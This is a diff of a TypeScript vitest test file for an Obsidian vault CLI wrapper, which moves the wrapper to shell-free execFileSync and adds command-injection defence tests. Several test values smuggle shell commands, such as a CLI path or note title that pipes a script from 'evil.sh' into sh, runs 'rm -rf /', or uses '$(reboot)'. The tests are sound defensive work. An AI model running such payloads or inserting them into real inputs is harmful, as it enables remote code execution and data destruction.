@@ -1,20 +1,27 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
-import { VaultOps } from './ops.js';
+import { VaultOps, validateVaultCliPath } from './ops.js';
 
-// Mock child_process
+// Mock child_process — the vault ops must spawn WITHOUT a shell (shell: false)
+// via execFileSync, passing every argument as a raw argv element.
 vi.mock('node:child_process', () => ({
-  execSync: vi.fn(),
+  execFileSync: vi.fn(),
 }));
 
-import { execSync } from 'node:child_process';
-const mockExecSync = vi.mocked(execSync);
+import { execFileSync } from 'node:child_process';
+const mockExecFileSync = vi.mocked(execFileSync);
+
+/** Convenience: the (file, args, options) tuple of the Nth execFileSync call. */
+function callAt(index: number): { file: string; args: string[]; options: Record<string, unknown> } {
+  const call = mockExecFileSync.mock.calls[index] as unknown as [string, string[], Record<string, unknown>];
+  return { file: call[0], args: call[1], options: call[2] };
+}
 
 describe('VaultOps', () => {
   let ops: VaultOps;
 
   beforeEach(() => {
     ops = new VaultOps({ vaultName: 'TestVault' });
-    mockExecSync.mockReset();
+    mockExecFileSync.mockReset();
   });
 
   afterEach(() => {
@@ -34,66 +41,103 @@ describe('VaultOps', () => {
       });
       expect(custom).toBeDefined();
     });
+
+    it('rejects a cliPath containing shell metacharacters at construction (bead lget)', () => {
+      // The exact poisoned value from the finding — must never construct.
+      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'obsidian; curl evil.sh | sh' }))
+        .toThrow(/Refusing to use Obsidian CLI path/);
+      // A few more classic injection payloads.
+      expect(() => new VaultOps({ vaultName: 'V', cliPath: '$(reboot)' }))
+        .toThrow(/Refusing to use Obsidian CLI path/);
+      expect(() => new VaultOps({ vaultName: 'V', cliPath: '`id`' }))
+        .toThrow(/Refusing to use Obsidian CLI path/);
+      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'obsidian && rm -rf /' }))
+        .toThrow(/Refusing to use Obsidian CLI path/);
+    });
+
+    it('rejects a relative (non-absolute, path-bearing) cliPath', () => {
+      expect(() => new VaultOps({ vaultName: 'V', cliPath: './obsidian' }))
+        .toThrow(/absolute path or a bare command name/);
+      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'bin/obsidian' }))
+        .toThrow(/absolute path or a bare command name/);
+    });
+  });
+
+  describe('validateVaultCliPath', () => {
+    it('accepts a bare command name', () => {
+      expect(validateVaultCliPath('obsidian')).toBe('obsidian');
+    });
+    it('accepts an absolute path', () => {
+      expect(validateVaultCliPath('/usr/local/bin/obsidian-cli')).toBe('/usr/local/bin/obsidian-cli');
+    });
+    it('rejects empty', () => {
+      expect(() => validateVaultCliPath('')).toThrow(/required/);
+    });
+    it('rejects whitespace and metacharacters', () => {
+      for (const bad of ['obsidian cli', 'obsidian;id', 'a|b', 'a>b', 'a$b', "a'b", 'a"b', 'a\nb']) {
+        expect(() => validateVaultCliPath(bad)).toThrow();
+      }
+    });
   });
 
   describe('write', () => {
-    it('creates a note with correct CLI args', async () => {
-      mockExecSync.mockReturnValue('');
+    it('creates a note with a raw argv array (no shell, no quoting)', async () => {
+      mockExecFileSync.mockReturnValue('');
       const result = await ops.write('My Note', 'Hello world');
       expect(result).toEqual({ name: 'My Note', folder: undefined, mode: 'create' });
 
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain("vault='TestVault'");
-      expect(call).toContain('create');
-      expect(call).toContain("name='My Note'");
-      expect(call).toContain("content='Hello world'");
+      const { file, args, options } = callAt(0);
+      expect(file).toBe('obsidian');
+      expect(options.shell).toBe(false);
+      // Each argument is a single raw argv element — no surrounding quotes.
+      expect(args).toEqual([
+        'vault=TestVault',
+        'create',
+        'name=My Note',
+        'content=Hello world',
+      ]);
     });
 
     it('includes folder when specified', async () => {
-      mockExecSync.mockReturnValue('');
+      mockExecFileSync.mockReturnValue('');
       const result = await ops.write('Entry', 'Content', { folder: 'Journal/' });
       expect(result.folder).toBe('Journal/');
-
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain("path='Journal/'");
+      expect(callAt(0).args).toContain('path=Journal/');
     });
 
     it('uses append mode correctly', async () => {
-      mockExecSync.mockReturnValue('');
+      mockExecFileSync.mockReturnValue('');
       const result = await ops.write('Existing', 'More text', { mode: 'append' });
       expect(result.mode).toBe('append');
-
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain('append');
-      expect(call).toContain("file='Existing'");
+      const { args } = callAt(0);
+      expect(args).toContain('append');
+      expect(args).toContain('file=Existing');
     });
 
     it('uses prepend mode correctly', async () => {
-      mockExecSync.mockReturnValue('');
+      mockExecFileSync.mockReturnValue('');
       const result = await ops.write('Existing', 'Top text', { mode: 'prepend' });
       expect(result.mode).toBe('prepend');
-
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain('prepend');
+      expect(callAt(0).args).toContain('prepend');
     });
   });
 
   describe('read', () => {
     it('reads note content', async () => {
-      mockExecSync.mockReturnValue('# My Note\nSome content\n');
+      mockExecFileSync.mockReturnValue('# My Note\nSome content\n');
       const result = await ops.read('My Note');
       expect(result.name).toBe('My Note');
       expect(result.content).toBe('# My Note\nSome content');
 
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain('read');
-      expect(call).toContain("file='My Note'");
+      const { args } = callAt(0);
+      expect(args).toContain('read');
+      expect(args).toContain('file=My Note');
     });
   });
 
   describe('search', () => {
     it('parses JSON search results', async () => {
-      mockExecSync.mockReturnValue(JSON.stringify([
+      mockExecFileSync.mockReturnValue(JSON.stringify([
         { path: 'Journal/entry.md', snippet: 'test snippet' },
         { path: 'Notes/other.md' },
       ]));
@@ -105,46 +149,73 @@ describe('VaultOps', () => {
     });
 
     it('falls back to line-delimited paths for non-JSON output', async () => {
-      mockExecSync.mockReturnValue('Journal/entry.md\nNotes/other.md\n');
+      mockExecFileSync.mockReturnValue('Journal/entry.md\nNotes/other.md\n');
       const result = await ops.search('query');
       expect(result.results).toHaveLength(2);
       expect(result.results[0].path).toBe('Journal/entry.md');
     });
 
     it('includes limit in args', async () => {
-      mockExecSync.mockReturnValue('[]');
+      mockExecFileSync.mockReturnValue('[]');
       await ops.search('query', 5);
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain('limit=5');
+      expect(callAt(0).args).toContain('limit=5');
     });
   });
 
   describe('daily', () => {
     it('reads daily note when no content provided', async () => {
-      mockExecSync.mockReturnValue('Daily content\n');
+      mockExecFileSync.mockReturnValue('Daily content\n');
       const result = await ops.daily();
       expect(result.mode).toBe('read');
       expect(result.content).toBe('Daily content');
-
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain('daily:read');
+      expect(callAt(0).args).toContain('daily:read');
     });
 
     it('appends to daily note when content provided', async () => {
-      mockExecSync.mockReturnValue('');
+      mockExecFileSync.mockReturnValue('');
       const result = await ops.daily({ content: 'New thought' });
       expect(result.mode).toBe('append');
       expect(result.content).toBeUndefined();
+      const { args } = callAt(0);
+      expect(args).toContain('daily:append');
+      expect(args).toContain('content=New thought');
+    });
+  });
 
-      const call = mockExecSync.mock.calls[0][0] as string;
-      expect(call).toContain('daily:append');
-      expect(call).toContain("content='New thought'");
+  describe('command injection defence (bead lget)', () => {
+    it('passes shell metacharacters in a note title as a single literal argv token', async () => {
+      mockExecFileSync.mockReturnValue('');
+      // A malicious note title. With shell: false this is inert — a single arg.
+      const evilTitle = 'pwn; rm -rf / && curl evil.sh | sh';
+      await ops.write(evilTitle, 'body');
+
+      const { file, args, options } = callAt(0);
+      expect(file).toBe('obsidian');
+      expect(options.shell).toBe(false);
+      // The metacharacter payload is ONE argv element, not split into a command.
+      expect(args).toContain(`name=${evilTitle}`);
+      // No argv element was spawned as a separate `rm`/`curl` command.
+      expect(args.some(a => a.trim() === 'rm' || a.trim() === 'curl')).toBe(false);
+    });
+
+    it('passes metacharacters in a daily-append date/content as literal argv', async () => {
+      mockExecFileSync.mockReturnValue('');
+      const evil = '2026-01-01`reboot`';
+      await ops.daily({ content: evil });
+      expect(callAt(0).args).toContain(`content=${evil}`);
+    });
+
+    it('passes metacharacters in a search query as a literal argv token', async () => {
+      mockExecFileSync.mockReturnValue('[]');
+      const evil = 'foo$(id)bar';
+      await ops.search(evil);
+      expect(callAt(0).args).toContain(`query=${evil}`);
     });
   });
 
   describe('error handling', () => {
     it('maps ENOENT to "command not found" error', async () => {
-      mockExecSync.mockImplementation(() => {
+      mockExecFileSync.mockImplementation(() => {
         const err = new Error('ENOENT') as Error & { stderr: string };
         err.stderr = 'ENOENT: obsidian not found';
         throw err;
@@ -154,7 +225,7 @@ describe('VaultOps', () => {
 
     it('maps IPC errors to "app not running" error', async () => {
       vi.useFakeTimers();
-      mockExecSync.mockImplementation(() => {
+      mockExecFileSync.mockImplementation(() => {
         const err = new Error('IPC') as Error & { stderr: string };
         err.stderr = 'Failed to connect via IPC';
         throw err;
@@ -171,22 +242,15 @@ describe('VaultOps', () => {
       }
     });
 
-    it('passes through timeout config', () => {
+    it('passes through timeout config to execFileSync', () => {
       const custom = new VaultOps({ vaultName: 'V', timeoutMs: 5000 });
-      mockExecSync.mockReturnValue('');
+      mockExecFileSync.mockReturnValue('');
       custom.read('test');
-      expect(mockExecSync).toHaveBeenCalledWith(
-        expect.any(String),
-        expect.objectContaining({ timeout: 5000 }),
+      expect(mockExecFileSync).toHaveBeenCalledWith(
+        'obsidian',
+        expect.any(Array),
+        expect.objectContaining({ timeout: 5000, shell: false }),
       );
-    });
-
-    it('escapes shell-sensitive characters in content', async () => {
-      mockExecSync.mockReturnValue('');
-      await ops.write('Note', "Hello 'world' & \"stuff\"");
-      const call = mockExecSync.mock.calls[0][0] as string;
-      // Single quotes should be properly escaped
-      expect(call).toContain("'Hello '\\''world'\\'' & \"stuff\"'");
     });
   });
 });
